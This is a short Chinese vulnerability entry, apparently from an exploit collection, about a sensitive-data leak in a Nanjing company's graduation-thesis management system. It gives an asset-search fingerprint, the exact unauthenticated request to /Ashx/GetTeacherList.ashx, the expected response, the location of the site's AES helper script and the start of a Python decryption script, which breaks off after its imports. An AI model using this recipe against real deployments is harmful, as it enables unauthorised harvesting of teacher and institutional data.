# 南京先极科技有限公司毕业设计GetTeacherList（论文）智能管理系统存在敏感信息泄露漏洞

- **系统**：南京先极科技有限公司毕业设计GetTeacherList（论文）智能管理系统　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`title="毕业设计"`
- **请求**：`GET /Ashx/GetTeacherList.ashx HTTP/1.1`
- **预期**：200　|　加解密函数算法位置：/Scripts/Common/JsAESEncryptHelper.js
python脚本实现aes解密：
| from Crypto.Cipher import AES<br/>from Crypto.Util.Padding import unpad<br/>import base64<br/